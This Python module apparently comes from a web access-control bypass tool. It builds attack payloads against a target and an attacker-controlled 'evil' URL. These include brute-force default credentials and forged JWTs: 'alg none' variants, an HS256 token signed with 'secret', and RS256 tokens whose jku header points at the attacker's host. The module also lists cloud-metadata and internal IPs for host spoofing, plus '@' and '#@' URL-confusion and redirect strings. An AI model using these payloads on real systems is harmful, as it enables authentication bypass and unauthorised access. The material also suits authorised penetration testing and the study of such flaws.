#!/usr/bin/env python3

from . import array, crypto, encode, path, url

class CommonValues:

	def __init__(self):
		"""
		Class for storing predefined values.\n
		TO DO: Add support for IPv6.
		"""
		self.localhost = self.Host(
			domains = ["localhost", encode.to_unicode("localhost")],
			ips     = ["127.0.0.1", "127.1", "127.000.000.001", encode.to_unicode("127.0.0.1")]
		)
		self.internal  = self.Host(
			domains = [],
			ips     = ["0.0.0.0", "10.1.1.1", "169.254.169.254", "172.16.1.1", "192.168.1.1"]
		)
		self.public    = self.Host(
			domains = [],
			ips     = []
		)
		# --------------------------------
		self.methods = ["ACL", "ARBITRARY", "BASELINE-CONTROL", "BIND", "CHECKIN", "CHECKOUT", "CONNECT", "COPY", "DELETE", "GET", "HEAD", "INDEX", "LABEL", "LINK", "LOCK", "MERGE", "MKACTIVITY", "MKCALENDAR", "MKCOL", "MKREDIRECTREF", "MKWORKSPACE", "MOVE", "OPTIONS", "ORDERPATCH", "PATCH", "POST", "PRI", "PROPFIND", "PROPPATCH", "PUT", "REBIND", "REPORT", "SEARCH", "SHOWMETHOD", "SPACEJUMP", "TEXTSEARCH", "TRACE", "TRACK", "UNBIND", "UNCHECKOUT", "UNLINK", "UNLOCK", "UPDATE", "UPDATEREDIRECTREF", "VERSION-CONTROL"]
		self.ports   = [80, 81, 443, 4443, 8000, 8008, 8080, 8081, 8403, 8443, 8888, 9000, 9008, 9080, 9081, 9403, 9443]
		# --------------------------------
		self.usernames = ["admin", "cisco", "gateway", "guest", "jigsaw", "root", "router", "switch", "sysadmin", "tomcat", "wampp", "xampp"]
		self.passwords = ["admin", "cisco", "default", "gateway", "guest", "jigsaw", "password", "root", "router", "secret", "switch", "sysadmin", "tomcat", "toor", "wampp", "xampp"]

	class Host:

		def __init__(self, domains: list[str] = [], ips: list[str] = []):
			"""
			Class for storing predefined values based on the URL host.
			"""
			self.domains = domains
			self.ips     = ips
			self.all     = array.unique(self.domains + self.ips)

values = CommonValues()
"""
Singleton class instance for fetching predefined values.
"""

# ----------------------------------------

def get_relative_paths(inaccessible_url: url.URL):
	"""
	Get a list of expanded relative URL paths with and without the URL parameters.\n
	Returns a unique list.
	"""
	return path.expand(inaccessible_url.path.path_no_parameters, inaccessible_url.query_string.string, inaccessible_url.fragment.string)

# ----------------------------------------

def get_basic_credentials():
	"""
	Get null values and predefined Base64 encoded credentials.
	"""
	tmp = ["", "null", "nil", "None"]
	for username in values.usernames:
		for password in values.passwords:
			tmp.append(encode.b64_credentials(username, password))
	return array.unique(tmp)

def get_bearer_credentials(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get null values, malformed JWTs, and predefined JWTs.
	"""
	tmp = ["", "null", "nil", "None"]
	# ------------------------------------
	payload = {"admin": True}
	payload_encoded = encode.b64_payload(payload)
	# ------------------------------------
	for alg in ["none", "nOnE", "None", "NONE"]:
		headers = encode.b64_payload({"alg": alg, "typ": "JWT"})
		tmp.append(f"{headers}.{payload_encoded}.")
	# ------------------------------------
	headers = encode.b64_payload({"alg": "ES256", "typ": "JWT"})
	tmp.append(f"{headers}.{payload_encoded}.MAYCAQACAQA")
	# ------------------------------------
	for key in ["secret", encode.b64("secret")]:
		tmp.append(encode.jwt("HS256", key, payload))
	# ------------------------------------
	key = crypto.create_private_key()
	for root_url in inaccessible_url.domain.scheme_domains + evil_url.domain.scheme_domains:
		tmp.append(encode.jwt("RS256", key, payload, {"jku": f"{root_url}/.well-known/jwks.json"}))
	# ------------------------------------
	return array.unique(tmp)

# ----------------------------------------

def get_domains(inaccessible_url: url.URL, evil_url: url.URL, include_builtin_values = True):
	"""
	Get a list of domain names with and without the port number.\n
	Returns a unique list.
	"""
	tmp  = []
	tmp += inaccessible_url.domain.domains if not inaccessible_url.is_ip() else []
	tmp += evil_url.domain.domains         if not evil_url.is_ip()         else []
	if include_builtin_values:
		for domain in values.localhost.domains:
			tmp.extend([
				domain,
				f"{domain}:{inaccessible_url.port}"
			])
		for domain in values.internal.domains:
			tmp.append(domain)
	return array.unique(tmp)

def get_ips(inaccessible_url: url.URL, evil_url: url.URL, include_builtin_values = True):
	"""
	Get a list of IP addresses with and without the port number.\n
	Returns a unique list.
	"""
	tmp = inaccessible_url.ip.ips + evil_url.ip.ips
	if include_builtin_values:
		for ip in values.localhost.ips:
			tmp.extend([
				ip,
				f"{ip}:{inaccessible_url.port}"
			])
		for ip in values.internal.ips:
			tmp.append(ip)
	return array.unique(tmp)

def get_hosts(inaccessible_url: url.URL, evil_url: url.URL, include_builtin_values = True):
	"""
	Get a list of IP addresses and domain names with and without the port number.\n
	Returns a unique list.
	"""
	return array.unique(get_domains(inaccessible_url, evil_url, include_builtin_values) + get_ips(inaccessible_url, evil_url, include_builtin_values))

# ----------------------------------------

def get_multi_domains(inaccessible_url: url.URL):
	"""
	Get a list of comma-separated domain names with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	if not inaccessible_url.is_ip():
		for localhost in ["localhost", f"localhost:{inaccessible_url.port}"]:
			for initial in inaccessible_url.domain.domains:
				tmp.append(f"{localhost},{initial}")
	return array.unique(tmp)

def get_multi_ips(inaccessible_url: url.URL):
	"""
	Get a list of comma-separated IP addresses with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	for localhost in ["127.0.0.1", f"127.0.0.1:{inaccessible_url.port}"]:
		for initial in inaccessible_url.ip.ips:
			tmp.append(f"{localhost},{initial}")
	return array.unique(tmp)

def get_multi_hosts(inaccessible_url: url.URL):
	"""
	Get a list of comma-separated IP addresses and domain names with and without the port number.\n
	Returns a unique list.
	"""
	return array.unique(get_multi_domains(inaccessible_url) + get_multi_ips(inaccessible_url))

# ----------------------------------------

def get_root_urls(inaccessible_url: url.URL, evil_url: url.URL, include_builtin_values = True):
	"""
	Get a list of root URLs with an IP address and domain name, with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	for url in [inaccessible_url, evil_url]:
		for root_url in url.domain.scheme_domains + url.ip.scheme_ips:
			tmp.append(root_url)
	if include_builtin_values:
		for host in values.localhost.all:
			tmp.extend([
				f"{inaccessible_url.scheme}://{host}",
				f"{inaccessible_url.scheme}://{host}:{inaccessible_url.port}"
			])
		for host in values.internal.all:
			tmp.append(f"{inaccessible_url.scheme}://{host}")
	return array.unique(tmp)

def get_full_urls(inaccessible_url: url.URL, evil_url: url.URL, include_builtin_values = True):
	"""
	Get a list of full URLs with an IP address and domain name, with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	for url in [inaccessible_url, evil_url]:
		for root_url in url.domain.scheme_domains + url.ip.scheme_ips:
			tmp.extend([
				f"{root_url}{url.path.path}",
				f"{root_url}{url.path.path_no_parameters}"
			])
	if include_builtin_values:
		for host in values.localhost.all:
			tmp.extend([
				f"{inaccessible_url.scheme}://{host}{inaccessible_url.path.path}",
				f"{inaccessible_url.scheme}://{host}{inaccessible_url.path.path_no_parameters}",
				f"{inaccessible_url.scheme}://{host}:{inaccessible_url.port}{inaccessible_url.path.path}",
				f"{inaccessible_url.scheme}://{host}:{inaccessible_url.port}{inaccessible_url.path.path_no_parameters}"
			])
		for host in values.internal.all:
			tmp.append(f"{inaccessible_url.scheme}://{host}")
	return array.unique(tmp)

# ----------------------------------------

def get_broken_domains(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of broken domain names with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	if not inaccessible_url.is_ip():
		for evil in evil_url.domain.domains:
			for initial in inaccessible_url.domain.domains:
				for injection in ["@", " @", "#@"]:
					tmp.append(initial + injection + evil)
	return array.unique(tmp)

def get_broken_ips(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of broken IP addresses with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	for evil in evil_url.ip.ips:
		for initial in inaccessible_url.ip.ips:
			for injection in ["@", " @", "#@"]:
				tmp.append(initial + injection + evil)
	return array.unique(tmp)

def get_broken_hosts(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of broken IP addresses and domain names with and without the port number.\n
	Returns a unique list.
	"""
	return array.unique(get_broken_domains(inaccessible_url, evil_url) + get_broken_ips(inaccessible_url, evil_url))

# ----------------------------------------

def get_broken_root_urls(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of broken root URLs with an IP address and domain name, with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	for host in get_broken_hosts(inaccessible_url, evil_url):
		tmp.append(f"{evil_url.scheme}://{host}")
	return array.unique(tmp)

def get_broken_full_urls(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of broken full URLs with an IP address and domain name, with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	for root_url in get_broken_root_urls(inaccessible_url, evil_url):
		tmp.extend([
			f"{root_url}{evil_url.path.path}",
			f"{root_url}{evil_url.path.path_no_parameters}"
		])
	return array.unique(tmp)

# ----------------------------------------

def get_redirect_domains(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of redirect domain names with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	if not evil_url.is_ip():
		for evil in evil_url.domain.domains:
			tmp.append(evil)
			if not inaccessible_url.is_ip():
				tmp.append(f"{inaccessible_url.domain.domain}.{evil}")
	return array.unique(tmp)

def get_redirect_ips(inaccessible_url_ignored: url.URL, evil_url: url.URL):
	"""
	Get a list of redirect IP addresses with and without the port number.\n
	Returns a unique list.
	"""
	return array.unique(evil_url.ip.ips)

def get_redirect_hosts(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of redirect IP addresses and domain names with and without the port number.\n
	Returns a unique list.
	"""
	return array.unique(get_redirect_domains(inaccessible_url, evil_url) + get_redirect_ips(inaccessible_url, evil_url))

# ----------------------------------------

def get_redirect_root_urls(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of redirect root URLs with an IP address and domain name, with and without the port number.\n
	Returns a unique list.
	"""
	tmp = []
	for host in get_redirect_hosts(inaccessible_url, evil_url):
		tmp.append(f"{evil_url.scheme}://{host}")
	return array.unique(tmp)

def get_redirect_full_urls(inaccessible_url: url.URL, evil_url: url.URL):
	"""
	Get a list of redirect full URLs with and without the port number and URL parameters.\n
	Returns a unique list.
	"""
	tmp = []
	for root_url in get_redirect_root_urls(inaccessible_url, evil_url):
		tmp.extend([
			f"{root_url}{evil_url.path.path}",
			f"{root_url}{evil_url.path.path_no_parameters}"
		])
	for evil in evil_url.domain.scheme_domains + evil_url.ip.scheme_ips:
		for initial in [inaccessible_url.domain.domain, inaccessible_url.ip.ip]:
			for injection in [f"{path.SEP}", f"{path.SEP}."]:
				tmp.extend([
					f"{evil}{injection}{initial}{evil_url.path.path}",
					f"{evil}{injection}{initial}{evil_url.path.path_no_parameters}"
				])
	return array.unique(tmp)
